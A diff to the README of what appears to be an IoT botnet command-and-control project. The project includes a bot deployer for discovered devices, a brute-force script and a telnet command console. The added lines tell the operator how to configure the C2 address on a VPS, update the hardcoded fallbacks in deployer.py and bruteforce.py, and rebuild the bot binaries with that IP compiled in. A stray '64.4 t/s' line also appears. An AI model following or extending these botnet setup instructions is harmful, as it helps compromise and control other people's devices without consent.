@@ -16,6 +16,11 @@ A C2 (Command & Control) infrastructure for an IoT botnet with:
 - A **deployer** tool for installing bots on discovered devices
 - A **telnet-based command console** (via PuTTY, port 6667)
 
+Tip: Find your public IP with curl ifconfig.me on your VPS. config.json is the primary source — deployer.py and bruteforce.py read from it automatically, but update their hardcoded fallbacks too for safety. The bot binaries (agent.c/agent.go) have the IP compiled in at build time, so rebuild them after changing.
+you can either use your home public ip or a vps either will work it is recomended to use a vps.
+
+64.4 t/s
+
 ---
 
 ## Project Structure
